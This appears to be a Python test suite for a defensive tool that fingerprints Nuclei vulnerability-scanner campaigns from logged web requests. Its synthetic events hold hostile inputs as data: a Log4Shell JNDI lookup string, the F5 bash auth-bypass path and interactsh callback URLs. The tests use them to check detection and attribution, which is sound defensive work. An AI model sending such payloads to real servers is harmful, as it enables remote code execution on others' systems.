import json
import unittest
from pathlib import Path

from nucleotide.actor import (
    classify_event,
    fingerprint,
    infer_custom_headers,
    infer_random_agent,
    infer_scan_strategy,
    infer_tags_filter,
    parse_events_jsonl,
    to_yaml,
)
from nucleotide.build import build_lookup
from nucleotide.runtime import NUCLEI_DEFAULT_UA_EXAMPLE, NUCLEI_RANDOM_UA_POOL

FIXTURES = Path(__file__).parent / "fixtures"


def _build_events(tids, uris, ua=None, headers=None, oast_host=None, ts_start=0):
    """Compose a synthetic events list."""
    events = []
    for i, (tid, uri) in enumerate(zip(tids, uris)):
        ev = {
            "ts": f"2026-06-01T10:00:{i:02d}Z",
            "src_ip": "10.0.0.1",
            "uri": uri,
            "target": "victim.example",
        }
        if ua is not None:
            ev["ua"] = ua if isinstance(ua, str) else ua[i % len(ua)]
        if headers:
            ev["headers"] = {k: v(i) if callable(v) else v for k, v in headers.items()}
        if oast_host:
            ev["oast_hosts"] = [oast_host]
        events.append(ev)
    return events


class TestClassify(unittest.TestCase):
    def test_matches_template_by_uri_snippet(self):
        lookup = build_lookup(FIXTURES)
        ev = {"uri": "https://x/wp-content/plugins/akismet/readme.txt"}
        clf = classify_event(ev, lookup)
        self.assertIn("wordpress-akismet", clf["matched_templates"])

    def test_reports_default_oast_host(self):
        lookup = {"snippet_index": {}}
        ev = {"uri": "/", "body": "http://abc123.oast.online/cb"}
        clf = classify_event(ev, lookup)
        self.assertIn("abc123.oast.online", clf["oast_hosts"])
        self.assertTrue(clf["runtime_signals"]["oast_host_is_default"])


class TestInferenceHelpers(unittest.TestCase):
    def test_tags_intersection(self):
        lookup = build_lookup(FIXTURES)
        # Two CVEs with an OAST body callback + Nuclei-style tags.
        tags = infer_tags_filter(
            ["CVE-2021-44228", "CVE-2022-22965", "CVE-2022-26134"], lookup
        )
        self.assertIn("cve", tags)

    def test_random_agent_inferred_only_with_multiple_uas_from_pool(self):
        # Single UA -> False.
        events = [{"ua": NUCLEI_DEFAULT_UA_EXAMPLE} for _ in range(5)]
        self.assertFalse(infer_random_agent(events))
        # Multiple UAs sampled from the Nuclei pool -> True.
        pool_list = list(NUCLEI_RANDOM_UA_POOL)[:5]
        events = [{"ua": u} for u in pool_list]
        self.assertTrue(infer_random_agent(events))
        # Multiple UAs but from a foreign source -> False.
        events = [{"ua": f"CustomTool/{i}"} for i in range(5)]
        self.assertFalse(infer_random_agent(events))

    def test_custom_header_recognizes_uuid_shape(self):
        import uuid
        events = [
            {"headers": {"X-Trace-Id": str(uuid.uuid4())}} for _ in range(10)
        ]
        headers = infer_custom_headers(events)
        matched = [h for h in headers if h["name"] == "X-Trace-Id"]
        self.assertEqual(len(matched), 1)
        self.assertEqual(matched[0]["shape"], "uuid")

    def test_custom_header_literal_value_across_events(self):
        events = [
            {"headers": {"X-Trace-Id": "abcdef-12345"}} for _ in range(5)
        ]
        headers = infer_custom_headers(events)
        self.assertEqual(headers[0]["value"], "abcdef-12345")
        self.assertEqual(headers[0]["shape"], "literal")

    def test_scan_strategy_template_spray(self):
        # 4 hosts, template A hits all 4 then template B hits all 4.
        events = [
            {"matched_templates": ["A"], "target": f"h{i}"} for i in range(4)
        ] + [
            {"matched_templates": ["B"], "target": f"h{i}"} for i in range(4)
        ] + [
            {"matched_templates": ["C"], "target": f"h{i}"} for i in range(4)
        ]
        self.assertEqual(infer_scan_strategy(events), "template-spray")

    def test_scan_strategy_host_spray(self):
        # Host X sees templates A,B,C, then host Y sees A,B,C, etc.
        events = []
        for host in ("hX", "hY", "hZ", "hW"):
            for tid in ("A", "B", "C"):
                events.append({"matched_templates": [tid], "target": host})
        self.assertEqual(infer_scan_strategy(events), "host-spray")


class TestFingerprintScenarios(unittest.TestCase):
    """The six pinned scenarios from the Phase 1 plan."""

    @classmethod
    def setUpClass(cls):
        cls.lookup = build_lookup(FIXTURES)

    def test_1_stable_header_and_default_interactsh(self):
        # Synthesize events that hit Log4Shell, F5 auth-bypass, and WP-akismet,
        # with a stable X-Trace-Id header and OAST callbacks to oast.online.
        events = [
            {
                "ts": f"2026-06-01T10:00:{i:02d}Z",
                "src_ip": "1.2.3.4",
                "target": "victim.example",
                "uri": uri,
                "ua": NUCLEI_DEFAULT_UA_EXAMPLE,
                "headers": {"X-Trace-Id": "abcdef-12345"},
                "body": f"callback=http://{i:04d}.oast.online/cb",
            }
            for i, uri in enumerate(
                [
                    "/wp-content/plugins/akismet/readme.txt",
                    "/mgmt/tm/util/bash",
                    "/?x=${jndi:ldap://x/y}",
                ]
            )
        ]
        fp = fingerprint(events, self.lookup, actor_id="scenario-1")[
            "actor_fingerprint"
        ]
        self.assertEqual(fp["tool_inference"]["likely_tool"], "nuclei")
        # -H captured as a literal (same value every event).
        h = fp["inferred_cli_options"]["-H"]
        self.assertTrue(any(x["name"] == "X-Trace-Id" and x["shape"] == "literal" for x in h))
        # -interactsh-server captured as default oast.online.
        ish = fp["inferred_cli_options"]["-interactsh-server"]
        self.assertIsNotNone(ish)
        self.assertEqual(ish["host"], "oast.online")
        self.assertTrue(ish["is_default"])
        # Structural hash is present and deterministic.
        self.assertTrue(fp["structural_hash"].startswith("sha256:"))
        fp2 = fingerprint(events, self.lookup, actor_id="scenario-1")[
            "actor_fingerprint"
        ]
        self.assertEqual(fp["structural_hash"], fp2["structural_hash"])

    def test_2_random_agent_recovered_from_ua_pool(self):
        pool = list(NUCLEI_RANDOM_UA_POOL)[:6]
        events = _build_events(
            tids=["A"] * 6,
            uris=["/wp-content/plugins/akismet/readme.txt"] * 6,
            ua=pool,
        )
        fp = fingerprint(events, self.lookup)["actor_fingerprint"]
        self.assertTrue(fp["inferred_cli_options"]["-random-agent"])

    def test_3_uuid_shaped_header_recognized_as_shape_not_literal(self):
        import uuid
        events = [
            {
                "uri": "/wp-content/plugins/akismet/readme.txt",
                "target": "victim.example",
                "headers": {"X-Trace-Id": str(uuid.uuid4())},
            }
            for _ in range(5)
        ]
        fp = fingerprint(events, self.lookup)["actor_fingerprint"]
        h = fp["inferred_cli_options"]["-H"]
        matched = [x for x in h if x["name"] == "X-Trace-Id"]
        self.assertTrue(matched)
        self.assertEqual(matched[0]["shape"], "uuid")
        self.assertEqual(matched[0]["value"], "{uuid}")

    def test_4_host_spray_strategy_recognized(self):
        events = []
        for host in ("hX", "hY", "hZ", "hW"):
            for uri in (
                "/wp-content/plugins/akismet/readme.txt",
                "/wp-content/plugins/contact-form-7/readme.txt",
                "/wp-content/plugins/jetpack/readme.txt",
            ):
                events.append({"uri": uri, "target": host, "ts": f"2026-06-01T10:{len(events):02d}:00Z"})
        fp = fingerprint(events, self.lookup)["actor_fingerprint"]
        self.assertEqual(fp["inferred_cli_options"]["-scan-strategy"], "host-spray")

    def test_5_compare_identical_and_diff(self):
        from nucleotide.cli import _diff_fingerprints

        events = _build_events(
            tids=["A", "A"],
            uris=[
                "/wp-content/plugins/akismet/readme.txt",
                "/wp-content/plugins/jetpack/readme.txt",
            ],
            ua=NUCLEI_DEFAULT_UA_EXAMPLE,
        )
        fp_a = fingerprint(events, self.lookup, actor_id="scenario-5")
        # Identical run -> identical fingerprint -> diff is empty.
        fp_b = fingerprint(events, self.lookup, actor_id="scenario-5")
        diff = _diff_fingerprints(fp_a, fp_b)
        self.assertTrue(diff["identical"])

        # Perturb one field (add another distinctive header) -> diff surfaces it.
        events2 = [
            {**ev, "headers": {"X-Attack": "different"}} for ev in events
        ]
        fp_c = fingerprint(events2, self.lookup, actor_id="scenario-5")
        diff2 = _diff_fingerprints(fp_a, fp_c)
        self.assertFalse(diff2["identical"])
        self.assertTrue(
            any("-H" in k for k in diff2["diverged_fields"])
            or any("hits_by_template" in k for k in diff2["diverged_fields"])
        )

    def test_6_match_scores_drift(self):
        from nucleotide.cli import _match_score

        base_events = _build_events(
            tids=["A"] * 3,
            uris=[
                "/wp-content/plugins/akismet/readme.txt",
                "/wp-content/plugins/jetpack/readme.txt",
                "/wp-content/plugins/contact-form-7/readme.txt",
            ],
            ua=NUCLEI_DEFAULT_UA_EXAMPLE,
            headers={"X-Trace-Id": "abcdef-12345"},
        )
        ref_fp = fingerprint(base_events, self.lookup, actor_id="ref")["actor_fingerprint"]

        # Same shape, identical events -> perfect match.
        cand_fp = fingerprint(base_events, self.lookup, actor_id="cand")["actor_fingerprint"]
        score, findings = _match_score(ref_fp, cand_fp)
        self.assertEqual(score, 1.0)
        self.assertIn("structural_hash identical", findings)

        # Drifted: templates the actor hits differ.
        drift_events = _build_events(
            tids=["A"] * 3,
            uris=[
                "/mgmt/tm/util/bash",
                "/saml/login",
                "/?x=${jndi:ldap://x/y}",
            ],
            ua=NUCLEI_DEFAULT_UA_EXAMPLE,
            headers={"X-Trace-Id": "abcdef-12345"},
        )
        drift_fp = fingerprint(drift_events, self.lookup, actor_id="drift")["actor_fingerprint"]
        drift_score, _ = _match_score(ref_fp, drift_fp)
        self.assertLess(drift_score, 1.0)


class TestEventParsing(unittest.TestCase):
    def test_parses_jsonl_text(self):
        text = '{"uri":"/a"}\n\n{"uri":"/b"}\n'
        events = parse_events_jsonl(text)
        self.assertEqual([e["uri"] for e in events], ["/a", "/b"])

    def test_reports_bad_line(self):
        with self.assertRaises(ValueError):
            parse_events_jsonl("{not-json}\n")


class TestYamlDump(unittest.TestCase):
    def test_nested_dict_and_list_roundtrip(self):
        import yaml
        obj = {
            "actor_fingerprint": {
                "id": "a-123",
                "tags": ["cve", "rce"],
                "options": {"-H": [{"name": "X", "value": "abc"}]},
                "enabled": True,
                "score": 0.94,
                "empty": None,
            }
        }
        text = to_yaml(obj)
        parsed = yaml.safe_load(text)
        self.assertEqual(parsed, obj)


if __name__ == "__main__":
    unittest.main()
